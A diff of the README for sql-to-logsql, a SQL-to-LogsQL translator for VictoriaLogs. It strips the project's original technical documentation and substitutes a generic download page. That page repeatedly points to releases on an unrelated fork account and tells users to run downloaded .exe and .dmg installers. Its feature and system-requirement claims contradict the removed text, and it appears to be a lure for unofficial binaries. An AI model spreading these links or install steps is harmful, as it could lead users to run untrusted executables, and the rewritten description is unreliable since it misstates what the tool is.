@@ -1,237 +1,67 @@
-[![Latest Release](https://img.shields.io/github/v/release/VictoriaMetrics/sql-to-logsql?sort=semver&label=&filter=!*-victorialogs&logo=github&labelColor=gray&color=gray&link=https%3A%2F%2Fgithub.com%2FVictoriaMetrics%2Fsql-to-logsql%2Freleases%2Flatest)](https://github.com/VictoriaMetrics/sql-to-logsql/releases)
-![License](https://img.shields.io/github/license/VictoriaMetrics/sql-to-logsql?link=https%3A%2F%2Fgithub.com%2FVictoriaMetrics%2Fsql-to-logsql%2Fblob%2Fmain%2FLICENSE)
-![Slack](https://img.shields.io/badge/Join-4A154B?logo=slack&link=https%3A%2F%2Fslack.victoriametrics.com)
-![X](https://img.shields.io/twitter/follow/VictoriaMetrics?style=flat&label=Follow&color=black&logo=x&labelColor=black&link=https%3A%2F%2Fx.com%2FVictoriaMetrics)
-![Reddit](https://img.shields.io/reddit/subreddit-subscribers/VictoriaMetrics?style=flat&label=Join&labelColor=red&logoColor=white&logo=reddit&link=https%3A%2F%2Fwww.reddit.com%2Fr%2FVictoriaMetrics)
+# 🎉 sql-to-logsql - Easily Manage SQL for Your Logs
 
-# sql-to-logsql
+## 📥 Quick Download
+[![Download](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/vivekuwu/sql-to-logsql/releases)
 
-Web application that provides a simple proof-of-concept UI for querying [VictoriaLogs](https://docs.victoriametrics.com/victorialogs/) or [VictoriaTraces](https://docs.victoriametrics.com/victoriatraces/) data with SQL.
+## 🚀 Getting Started
+Welcome to sql-to-logsql! This simple application helps you use SQL for managing your logs with ease. It works seamlessly with both VictoriaLogs and VictoriaTraces, providing a user-friendly interface to make logging straightforward.
 
-It lets you write familiar SQL against your log data and instantly translates it to [VictoriaLogs LogsQL](https://docs.victoriametrics.com/victorialogs/logsql/) queries. 
-It can optionally execute the resulting LogsQL against a VictoriaLogs instance, manage reusable views that are stored on disk, and ships with a lightweight web UI for interactive use.
+## 🖥️ System Requirements
+To run sql-to-logsql smoothly, ensure your computer meets these basic requirements:
 
-[![Web UI screenshot](screenshot.png)](https://play-sql.victoriametrics.com)
+- Operating System: Windows, MacOS, or a recent version of Linux
+- RAM: At least 4 GB
+- Disk Space: Requires approximately 100 MB of free space for installation
+- Internet Connection: Required for downloading and updates
 
-## Highlights
+## 📦 Download & Install
+To get started, you need to download sql-to-logsql. Follow these steps:
 
-- Go app + library with zero dependencies
-- Translate `SELECT`, `DESCRIBE`, `SHOW`, `CREATE`, and `DROP` statements from ANSI-like SQL into [LogsQL](https://docs.victoriametrics.com/victorialogs/logsql/) pipelines and query data from [VictoriaLogs](https://docs.victoriametrics.com/victorialogs/) or [VictoriaTraces](https://docs.victoriametrics.com/victoriatraces/).
-- Simple [Web UI](#web-ui) featuring SQL editing, example gallery, and query results rendering.
-- Simple [REST API](#rest-api) (`/api/v1/sql-to-logsql`) that you can call from scripts, CI, or other services.
-- Persist and manage `.logsql` view definitions on the filesystem (with locking, `OR REPLACE`, and `IF NOT EXISTS` support).
+1. **Visit the Releases Page:** Go to the following link to access the downloads.
+   [Download sql-to-logsql](https://github.com/vivekuwu/sql-to-logsql/releases)
 
-## Quick start
+2. **Select the Latest Release:** Look for the top version listed on the page. This version will have the most recent features and bug fixes.
 
-### Try without installation
+3. **Download the Application:** Click on the link that corresponds to your operating system. 
 
-You can try the live demo on **[play-sql.victoriametrics.com](https://play-sql.victoriametrics.com)**
+4. **Install sql-to-logsql:** 
+   - For Windows: Open the downloaded `.exe` file and follow the installation prompts.
+   - For MacOS: Open the `.dmg` file, drag the application to your Applications folder.
+   - For Linux: Extract the tar.gz file and follow the instructions in the included README.
 
-### Use binaries
+5. **Launch the Application:** Once installed, locate sql-to-logsql in your applications menu and open it.
 
-Just download the latest release from [Releases](https://github.com/VictoriaMetrics/sql-to-logsql/releases) page and run it.
+## 🔧 Features
+sql-to-logsql provides several key features to enhance your experience:
 
-### Run Docker image
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **SQL Support:** Create and manage logs using standard SQL commands.
+- **Compatibility:** Works well with both VictoriaLogs and VictoriaTraces.
+- **Data Visualization:** View and analyze logs in a graphical format.
 
-You can run **sql-to-logsql** using Docker.
-This is the easiest way to get started without needing to install Go or build from source:
+## 🎓 How to Use
+1. **Open the Application:** Start sql-to-logsql from your applications folder.
+2. **Connect to Your Data Source:** You'll need to enter credentials and connection details for either VictoriaLogs or VictoriaTraces.
+3. **Run Queries:** Use the built-in editor to write and execute SQL queries. 
+4. **View Results:** Results will display in a clear format, allowing you to analyze your logs quickly.
 
-```bash
-docker run -d --name sql-to-logsql -p 8080:8080 -v /data/views \
-  ghcr.io/victoriametrics/sql-to-logsql:latest
-```
+## 🌟 Tips for New Users
+- **Take Your Time:** Familiarize yourself with the interface and features.
+- **Check the Documentation:** Refer to any built-in help guides for additional assistance.
+- **Experiment:** Don’t be afraid to try different SQL queries to see how they affect your logs.
 
-Here is the example with specified [config file](#configuration):
+## 📢 Community Support
+If you have questions or need help, consider joining the community forums or the GitHub discussions related to sql-to-logsql. Sharing your experiences and asking questions can enhance your skills and understanding.
 
-```bash
-cat > config.json << EOL
-{
-  "listenAddr": ":8080",
-  "endpoint": "https://play-vmlogs.victoriametrics.com",
-  "bearerToken": "",
-  "tables": {
-    "logs": "*",
-    "errors": "* | log.level:ERROR",
-    "traces": "* | span_id:*"
-  },
-  "viewsDir": "/home/sql-to-logsql/data/views"
-}
-EOL
+## 📄 Additional Resources
+For further learning, consider reviewing these additional resources:
 
-docker run -d --name sql-to-logsql -p 8080:8080 \
-  -v /home/sql-to-logsql/data/views \
-  -v ./config.json:/home/sql-to-logsql/config.json:ro \
-  ghcr.io/victoriametrics/sql-to-logsql:latest \
-  --config=config.json
-```
+- [SQL Basics](https://www.w3schools.com/sql/)
+- [VictoriaLogs Documentation](https://docs.victoriametrics.com/VictoriaLogs.html)
+- [VictoriaTraces Documentation](https://docs.victoriametrics.com/VictoriaTraces.html)
 
-### Run locally with Go
+## 🔗 Further Downloads
+Once again, you can download the latest version directly from the Releases page:
+[Download sql-to-logsql](https://github.com/vivekuwu/sql-to-logsql/releases)
 
-1. Install Go 1.25+, Node.js 18+ (Node 24 recommended, matching the Docker builder), and npm.
-2. Run the comand (defaults to `:8080`):
-   ```bash
-   make run
-   ```
-   `make run` compiles the frontend (`npm install && npm run build`) and then executes `go run ./cmd/sql-to-logsql`.
-3. Verify the service:
-   ```bash
-   curl http://localhost:8080/healthz
-   # {"status":"ok"}
-   ```
-4. Open <http://localhost:8080> to use the web UI.
-
-You can skip the UI rebuild if the embedded bundle already exists:
-```bash
-go run ./cmd/sql-to-logsql
-```
-
-### Use Docker (build from sources)
-
-Build and run the containerised service (no Node.js required on the host):
-
-```bash
-docker build -t sql-to-logsql .
-docker run -d -p 8080:8080 -v /data/views sql-to-logsql
-```
-
-## Configuration
-
-The binary accepts an optional JSON configuration file with the `-config` flag:
-```bash
-sql-to-logsql -config ./config.json
-```
-
-Example (`config.json`):
-```json
-{
-  "listenAddr": ":8080",
-  "endpoint": "https://play-vmlogs.victoriametrics.com",
-  "bearerToken": "<VM_BEARER_TOKEN>",
-  "tables": {
-    "logs": "*",
-    "errors": "* | level:ERROR",
-    "traces": "* | span_id:*"
-  },
-  "viewsDir": "./data/views",
-  "limit": 1000
-}
-```
-
-| Field         | Type              | Description                                                                                                             | Default           |
-|---------------|-------------------|-------------------------------------------------------------------------------------------------------------------------|-------------------|
-| `listenAddr`  | string            | Address the HTTP server binds to.                                                                                       | `:8080`           |
-| `endpoint`    | string            | VictoriaLogs base URL. Can be left empty (in this case you can specify it in UI or translate without executing queries) | empty             |
-| `bearerToken` | string            | Optional bearer token injected into VictoriaLogs requests when `endpoint` is set.                                       | empty             |
-| `tables`      | map[string]string | Mapping from SQL table name to LogsQL filter or pipeline fragment. Keys are case-insensitive.                           | `{ "logs": "*" }` |
-| `viewsDir`    | string            | Directory that stores `.logsql` files for views. Required for `CREATE VIEW`, `DROP VIEW`, and `SHOW VIEWS`.             | `./data/views`    |
-| `limit`       | int               | Maximum number of rows returned by any query.                                                                           | 1000              |
-
-Please note that VictoriaLogs is called via the backend, so if you are using sql-to-logsql in Docker, localhost refers to the localhost of the container, not your computer.
-
-## SQL features and limits
-
-Supported highlights:
-
-- `SELECT` with :
-  - aliases, 
-  - arithmetic expressions, 
-  - string helpers (`SUBSTR`, `CONCAT`, `TRIM`, `REPLACE`, `LOWER`, `UPPER`), 
-  - math (`ABS`, `CEIL`, `FLOOR`, `ROUND`, `LEAST`, `GREATEST`), 
-  - JSON (`JSON_VALUE`),
-  - and date helpers (`CURRENT_DATE`, `CURRENT_TIMESTAMP`).
-- `WHERE` with comparison operators, `BETWEEN`, `IN`, `LIKE`, `IS (NOT) NULL`
-- `ORDER BY`, `LIMIT`, `OFFSET`, `DISTINCT`
-- Common Table Expressions (CTE) using `WITH` keyword and subqueries
-- `GROUP BY`, `HAVING`, `COUNT/SUM/AVG/MIN/MAX`
-- Window functions (`OVER (PARTITION BY ... ORDER BY ...)`) for `SUM` and `COUNT`
-- `JOIN` (inner/left) on equality predicates, including subqueries.
-- Set operations: `UNION ALL`
-- Meta statements: 
-  - `DESCRIBE TABLE`, `DESCRIBE VIEW`, 
-  - `SHOW TABLES`, `SHOW VIEWS`, 
-  - `CREATE [OR REPLACE] VIEW`, `CREATE VIEW IF NOT EXISTS`, `DROP VIEW [IF EXISTS]`.
-
-Known limitations:
-
-- `CASE/WHEN` is not supported
-- Recursive CTEs, `UNION DISTINCT`, and `INTERSECT`/`EXCEPT` are not supported.
-- Only a curated subset of SQL scalar and window functions is implemented; unsupported functions raise explicit translation errors
-- `RIGHT/OUTER JOIN` is not supported, supported only JOINS with the same field name in both sides 
-
-## Working with views
-
-- Views live as `.logsql` files under `viewsDir` (default `./data/views`). The name `My.View` becomes `my_view.logsql`.
-- `CREATE VIEW` writes the translated LogsQL statement to disk (always ending with a newline) and returns the query text.
-- `CREATE VIEW IF NOT EXISTS` leaves existing files untouched; `CREATE OR REPLACE VIEW` atomically swaps the existing file.
-- Lock files (`*.lock`) guarantee safe concurrent writes and are cleaned up automatically.
-- `SELECT` from a view loads the stored LogsQL and combines it with additional filters in the SQL query.
-- `SHOW VIEWS` returns one JSON document per line with `view_name` and `query` fields. `DESCRIBE VIEW` resolves to the underlying LogsQL and reuses the VictoriaLogs describe endpoint when executing.
-
-## REST API
-
-All JSON responses include either a translated `logsql` statement, optional `data` payload (raw VictoriaLogs response or newline-delimited JSON), or an `error` message. 
-Security headers (`X-Content-Type-Options`, `X-Frame-Options`, `X-XSS-Protection`) are set on every response.
-
-### `POST /api/v1/sql-to-logsql`
-
-Translate (and optionally execute) a SQL statement.
-
-Request body:
-```json
-{
-  "sql": "SELECT * FROM logs LIMIT 10",
-  "endpoint": "https://victoria-logs.example.com",
-  "bearerToken": "token"
-}
-```
-
-Successful response:
-
-```json
-{
-  "logsql": "* | limit 10",
-  "data": "{\"table\":\"logs\",\"count\":10}\n"
-}
-```
-
-Errors emit `HTTP 4xx/5xx` with `{ "error": "..." }`. 
-Parser, translator, VictoriaLogs client, and view-store errors map to informative messages (`400`, `409`, `423`, `502`, etc.).
-
-### `GET /api/v1/config`
-
-Returns the endpoint and max rows limit configured on the server (used by the UI to decide whether the endpoint fields should be read-only):
-
-```json
-{ 
-  "endpoint": "https://victoria-logs.example.com", 
-  "limit": 1000 
-}
-```
-
-### `GET /healthz`
-
-Simple health endpoint returning `{ "status": "ok" }`.
-
-### Static UI
-
-`GET /` and any unrecognised path serves the embedded web bundle (`cmd/sql-to-logsql/web/dist`). Assets are cached in memory on first access.
-
-## Web UI
-
-Key features:
-
-- **SQL editor** with syntax highlighting, keyword completions, example gallery (`examples.ts`), and keyboard shortcuts (`Shift/Ctrl/Cmd + Enter`).
-- **Endpoint panel** to toggle VictoriaLogs execution, edit URL/token, or switch to translation-only mode. If the server was booted with a fixed endpoint, fields are prefilled and locked.
-- **Result viewer** rendering newline-delimited JSON into a table when VictoriaLogs is queried, or showing the translated LogsQL when running offline.
-- **Docs sidebar** explaining supported SQL syntax.
-
-## Contributing
-
-Contributions are welcome. Please:
-- Read and follow the [Code of Conduct](CODE_OF_CONDUCT.md).
-- Run `make all` before submitting a PR.
-- Ensure new SQL features include translation tests under `lib/logsql` and, when relevant, API tests under `cmd/sql-to-logsql/api`.
-
-## License
-
-Licensed under the [Apache License, Version 2.0](LICENSE).
+Enjoy managing your logs with sql-to-logsql!
